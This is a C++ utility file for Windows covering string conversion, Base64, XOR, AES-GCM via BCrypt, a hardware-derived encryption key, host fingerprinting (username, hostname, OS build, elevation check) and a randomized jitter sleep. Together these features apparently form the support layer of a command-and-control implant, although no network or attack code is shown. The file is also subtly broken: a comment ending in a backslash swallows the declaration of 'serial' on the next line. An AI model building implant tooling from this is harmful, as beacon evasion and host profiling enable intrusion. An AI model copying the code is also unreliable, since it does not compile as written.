// utils.cpp — String conversion, Base64, XOR, AES-GCM (BCrypt), hardware key
// derivation, system info, jitter sleep.
#include "utils.hpp"
#include <windows.h>
#include <bcrypt.h>
#include <sstream>
#include <iomanip>
#include <random>
#include <chrono>
#include <lmcons.h>
#include <intrin.h>    // __cpuid

#pragma comment(lib, "bcrypt.lib")

// ---------------------------------------------------------------------------
// String conversion — WideChar <-> UTF-8
// ---------------------------------------------------------------------------

std::string WStringToUTF8(const std::wstring& wstr) {
    if (wstr.empty()) return {};
    int sz = WideCharToMultiByte(CP_UTF8, 0,
                                 wstr.c_str(), static_cast<int>(wstr.size()),
                                 nullptr, 0, nullptr, nullptr);
    if (sz <= 0) return {};
    std::string out(static_cast<size_t>(sz), '\0');
    WideCharToMultiByte(CP_UTF8, 0,
                        wstr.c_str(), static_cast<int>(wstr.size()),
                        &out[0], sz, nullptr, nullptr);
    return out;
}

std::wstring UTF8ToWString(const std::string& utf8) {
    if (utf8.empty()) return {};
    int sz = MultiByteToWideChar(CP_UTF8, 0,
                                 utf8.c_str(), static_cast<int>(utf8.size()),
                                 nullptr, 0);
    if (sz <= 0) return {};
    std::wstring out(static_cast<size_t>(sz), L'\0');
    MultiByteToWideChar(CP_UTF8, 0,
                        utf8.c_str(), static_cast<int>(utf8.size()),
                        &out[0], sz);
    return out;
}

// ---------------------------------------------------------------------------
// Base64 — RFC 4648 standard alphabet
// ---------------------------------------------------------------------------

static const char B64[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

std::string Base64Encode(const BYTE* data, size_t len) {
    std::string out;
    out.reserve(((len + 2) / 3) * 4);
    for (size_t i = 0; i < len; i += 3) {
        uint32_t b = static_cast<uint32_t>(data[i]) << 16;
        if (i + 1 < len) b |= static_cast<uint32_t>(data[i + 1]) << 8;
        if (i + 2 < len) b |= static_cast<uint32_t>(data[i + 2]);
        out.push_back(B64[(b >> 18) & 0x3F]);
        out.push_back(B64[(b >> 12) & 0x3F]);
        out.push_back((i + 1 < len) ? B64[(b >> 6) & 0x3F] : '=');
        out.push_back((i + 2 < len) ? B64[b & 0x3F]        : '=');
    }
    return out;
}

std::vector<BYTE> Base64Decode(const std::string& b64) {
    static int inv[256];
    static bool init = false;
    if (!init) {
        for (int i = 0; i < 256; ++i) inv[i] = -1;
        for (int i = 0; i < 64; ++i) inv[(unsigned char)B64[i]] = i;
        inv[(unsigned char)'='] = 0;
        init = true;
    }
    std::vector<BYTE> out;
    if (b64.size() % 4 != 0) return out;
    out.reserve((b64.size() / 4) * 3);
    for (size_t i = 0; i < b64.size(); i += 4) {
        uint32_t block = 0;
        for (int j = 0; j < 4; ++j) {
            int v = inv[(unsigned char)b64[i + j]];
            if (v < 0) return {};
            block = (block << 6) | static_cast<uint32_t>(v);
        }
        out.push_back(static_cast<BYTE>((block >> 16) & 0xFF));
        if (b64[i + 2] != '=') out.push_back(static_cast<BYTE>((block >> 8) & 0xFF));
        if (b64[i + 3] != '=') out.push_back(static_cast<BYTE>(block & 0xFF));
    }
    return out;
}

// ---------------------------------------------------------------------------
// XOR cipher — in-place
// ---------------------------------------------------------------------------

VOID XorBuffer(BYTE* data, size_t len, const BYTE* key, size_t keyLen) {
    if (keyLen == 0) return;
    for (size_t i = 0; i < len; ++i)
        data[i] ^= key[i % keyLen];
}

// ---------------------------------------------------------------------------
// DeriveHardwareKey — SHA256 of (VolumeSerial || CPUID || HostnameHash)
// Produces a 32-byte session key unique to this host.
// ---------------------------------------------------------------------------

std::vector<BYTE> DeriveHardwareKey() {
    // Collect entropy sources
    std::vector<BYTE> material;

    // 1. Volume serial of C:\
    DWORD serial = 0;
    GetVolumeInformationW(L"C:\\", nullptr, 0, &serial, nullptr, nullptr, nullptr, 0);
    material.insert(material.end(),
                    reinterpret_cast<BYTE*>(&serial),
                    reinterpret_cast<BYTE*>(&serial) + sizeof(serial));

    // 2. CPUID processor signature (leaf 1)
    int cpuInfo[4] = {};
    __cpuid(cpuInfo, 1);
    material.insert(material.end(),
                    reinterpret_cast<BYTE*>(cpuInfo),
                    reinterpret_cast<BYTE*>(cpuInfo) + sizeof(cpuInfo));

    // 3. Computer name (wide, raw bytes)
    wchar_t cn[MAX_COMPUTERNAME_LENGTH + 1] = {};
    DWORD cnLen = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerNameW(cn, &cnLen);
    auto* cnBytes = reinterpret_cast<BYTE*>(cn);
    material.insert(material.end(), cnBytes, cnBytes + cnLen * sizeof(wchar_t));

    // SHA-256 via BCrypt
    BCRYPT_ALG_HANDLE hAlg = nullptr;
    std::vector<BYTE> digest(32);

    if (BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM,
                                                   nullptr, 0))) {
        BCRYPT_HASH_HANDLE hHash = nullptr;
        if (BCRYPT_SUCCESS(BCryptCreateHash(hAlg, &hHash, nullptr, 0,
                                            nullptr, 0, 0))) {
            BCryptHashData(hHash, material.data(),
                           static_cast<ULONG>(material.size()), 0);
            BCryptFinishHash(hHash, digest.data(), 32, 0);
            BCryptDestroyHash(hHash);
        }
        BCryptCloseAlgorithmProvider(hAlg, 0);
    }

    return digest;
}

// ---------------------------------------------------------------------------
// AES-256-GCM encrypt via BCrypt.
// Wire format: [12-byte nonce][16-byte auth tag][ciphertext]
// Then Base64-encoded for JSON embedding.
// ---------------------------------------------------------------------------

std::string AesGcmEncrypt(const std::vector<BYTE>& key,
                          const std::string& plaintext) {
    if (key.size() != 32) return {};

    BCRYPT_ALG_HANDLE hAlg = nullptr;
    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(
            &hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0)))
        return {};

    // Set GCM chaining mode
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                      (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
                      sizeof(BCRYPT_CHAIN_MODE_GCM), 0);

    BCRYPT_KEY_HANDLE hKey = nullptr;
    if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(
            hAlg, &hKey, nullptr, 0,
            (PUCHAR)key.data(), 32, 0))) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return {};
    }

    // Random 12-byte nonce
    BYTE nonce[12] = {};
    BCryptGenRandom(nullptr, nonce, 12, BCRYPT_USE_SYSTEM_PREFERRED_RNG);

    BYTE tag[16] = {};
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce  = nonce;
    authInfo.cbNonce  = 12;
    authInfo.pbTag    = tag;
    authInfo.cbTag    = 16;

    ULONG cbCT = 0;
    BCryptEncrypt(hKey,
                  (PUCHAR)plaintext.data(),
                  static_cast<ULONG>(plaintext.size()),
                  &authInfo, nullptr, 0,
                  nullptr, 0, &cbCT, 0);

    std::vector<BYTE> ciphertext(cbCT);
    ULONG cbResult = 0;
    NTSTATUS st = BCryptEncrypt(
        hKey,
        (PUCHAR)plaintext.data(),
        static_cast<ULONG>(plaintext.size()),
        &authInfo, nullptr, 0,
        ciphertext.data(), cbCT, &cbResult, 0);

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    if (!BCRYPT_SUCCESS(st)) return {};

    // Concatenate: nonce || tag || ciphertext
    std::vector<BYTE> wire;
    wire.reserve(12 + 16 + cbResult);
    wire.insert(wire.end(), nonce, nonce + 12);
    wire.insert(wire.end(), tag, tag + 16);
    wire.insert(wire.end(), ciphertext.begin(), ciphertext.begin() + cbResult);

    return Base64Encode(wire.data(), wire.size());
}

// ---------------------------------------------------------------------------
// AES-256-GCM decrypt.
// Input: Base64-encoded wire [nonce:12][tag:16][ciphertext]
// ---------------------------------------------------------------------------

std::string AesGcmDecrypt(const std::vector<BYTE>& key,
                          const std::string& b64Wire) {
    if (key.size() != 32) return {};

    std::vector<BYTE> wire = Base64Decode(b64Wire);
    if (wire.size() < 12 + 16 + 1) return {};

    BYTE* nonce      = wire.data();
    BYTE* tag        = wire.data() + 12;
    BYTE* ciphertext = wire.data() + 28;
    ULONG ctLen      = static_cast<ULONG>(wire.size() - 28);

    BCRYPT_ALG_HANDLE hAlg = nullptr;
    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(
            &hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0)))
        return {};

    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                      (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
                      sizeof(BCRYPT_CHAIN_MODE_GCM), 0);

    BCRYPT_KEY_HANDLE hKey = nullptr;
    if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(
            hAlg, &hKey, nullptr, 0,
            (PUCHAR)key.data(), 32, 0))) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return {};
    }

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = nonce;
    authInfo.cbNonce = 12;
    authInfo.pbTag   = tag;
    authInfo.cbTag   = 16;

    std::vector<BYTE> plain(ctLen);
    ULONG cbResult = 0;
    NTSTATUS st = BCryptDecrypt(
        hKey, ciphertext, ctLen, &authInfo,
        nullptr, 0,
        plain.data(), ctLen, &cbResult, 0);

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    if (!BCRYPT_SUCCESS(st)) return {};
    return std::string(reinterpret_cast<char*>(plain.data()), cbResult);
}

// ---------------------------------------------------------------------------
// System info
// ---------------------------------------------------------------------------

std::wstring GetHostnameHash() {
    wchar_t hostname[MAX_COMPUTERNAME_LENGTH + 1] = {};
    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
    if (!GetComputerNameW(hostname, &size)) return L"00000000";

    uint32_t hash = 0x811c9dc5u;
    for (DWORD i = 0; i < size; ++i) {
        hash ^= static_cast<uint32_t>(hostname[i]);
        hash *= 0x01000193u;
    }

    std::wostringstream ss;
    ss << std::hex << std::setfill(L'0') << std::setw(8) << hash;
    return ss.str();
}

std::wstring GetUsername() {
    wchar_t user[UNLEN + 1] = {};
    DWORD size = UNLEN + 1;
    if (GetUserNameW(user, &size))
        return std::wstring(user, size > 0 ? size - 1 : 0);
    return L"unknown";
}

std::wstring GetHostname() {
    wchar_t hostname[MAX_COMPUTERNAME_LENGTH + 1] = {};
    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
    if (GetComputerNameW(hostname, &size))
        return std::wstring(hostname, size);
    return L"unknown";
}

DWORD GetOSBuild() {
    typedef NTSTATUS(NTAPI* RtlGetVersion_t)(PRTL_OSVERSIONINFOW);
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return 0;
    auto fn = reinterpret_cast<RtlGetVersion_t>(
        GetProcAddress(ntdll, "RtlGetVersion"));
    if (!fn) return 0;
    RTL_OSVERSIONINFOW vi = {};
    vi.dwOSVersionInfoSize = sizeof(vi);
    return (fn(&vi) == 0) ? vi.dwBuildNumber : 0;
}

BOOL IsElevated() {
    HANDLE hToken = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
        return FALSE;
    TOKEN_ELEVATION te = {};
    DWORD len = 0;
    BOOL result = FALSE;
    if (GetTokenInformation(hToken, TokenElevation, &te, sizeof(te), &len))
        result = te.TokenIsElevated;
    CloseHandle(hToken);
    return result;
}

// ---------------------------------------------------------------------------
// Jitter sleep — uniform distribution [minSec, maxSec]
// ---------------------------------------------------------------------------

VOID JitterSleep(DWORD minSec, DWORD maxSec) {
    if (minSec > maxSec) minSec = maxSec;

    static std::mt19937 gen = [] {
        std::random_device rd;
        return std::mt19937(rd() ^ static_cast<unsigned>(GetCurrentThreadId()));
    }();
    static CRITICAL_SECTION cs = [] {
        CRITICAL_SECTION c;
        InitializeCriticalSection(&c);
        return c;
    }();

    DWORD seconds;
    EnterCriticalSection(&cs);
    seconds = std::uniform_int_distribution<DWORD>(minSec, maxSec)(gen);
    LeaveCriticalSection(&cs);

    Sleep(seconds * 1000);
}